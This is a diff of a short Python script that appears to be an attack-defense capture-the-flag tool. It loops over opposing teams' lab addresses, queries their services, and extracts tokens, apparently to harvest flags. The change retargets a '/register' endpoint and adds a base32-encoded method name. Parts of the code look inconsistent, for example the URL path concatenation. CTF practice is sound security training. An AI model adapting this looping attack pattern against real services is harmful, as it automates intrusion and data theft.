@@ -1,11 +1,20 @@
 import requests
 import time
+import base64
 s = requests.Session()
 flags=[]
 teams={}
 teamid=[1,2,8,5,7,4]
+def decode_base32(encoded_data):
+    padding = len(encoded_data) % 8
+    if padding != 0:
+        encoded_data += '=' * (8 - padding)
+    decoded_data = base64.b32decode(encoded_data)
+    return decoded_data.decode()
+
+encoded_method = base64.b32encode('reg_post')
 for i in teamid:
-    addr='http://172.25.'+str(i)+'.2:31337/'
+    addr='http://172.25.'+str(i)+'.2:7000/register'
     r = s.get(addr+'/list')
     text=r.text
     token = (text.partition('\n')[0])[13:-1]
